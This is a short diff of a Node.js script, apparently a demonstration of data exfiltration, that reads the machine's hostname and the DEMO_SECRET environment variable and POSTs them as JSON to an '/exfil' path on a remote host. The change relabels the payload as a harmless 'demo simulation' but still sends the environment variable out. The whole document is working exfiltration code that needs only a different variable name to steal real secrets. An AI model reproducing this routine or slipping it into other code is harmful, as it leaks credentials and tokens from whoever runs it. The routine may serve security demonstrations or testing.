@@ -1,11 +1,11 @@
-const fs = require('fs');
-const os = require('os');
 const https = require('https');
+const os = require('os');
 
-const secret = process.env.DEMO_SECRET || 'no-secret';
-const data = JSON.stringify({
-  hostname: os.hostname(),
-  secret
+// Simulated exfiltration with a harmless payload for demo
+const payload = JSON.stringify({
+  status: "You have been hacked — demo simulation",
+  host: os.hostname(),
+  exposed_var: process.env.DEMO_SECRET || "not set"
 });
 
 const options = {
@@ -15,17 +15,17 @@ const options = {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json',
-    'Content-Length': data.length
+    'Content-Length': payload.length
   }
 };
 
 const req = https.request(options, res => {
-  console.log(`Exfiltrated to /exfil - status: ${res.statusCode}`);
+  console.log(`[exfil] Sent demo payload. Status: ${res.statusCode}`);
 });
 
 req.on('error', error => {
-  console.error('Failed exfil attempt:', error);
+  console.error(`[exfil] Error: ${error}`);
 });
 
-req.write(data);
+req.write(payload);
 req.end();
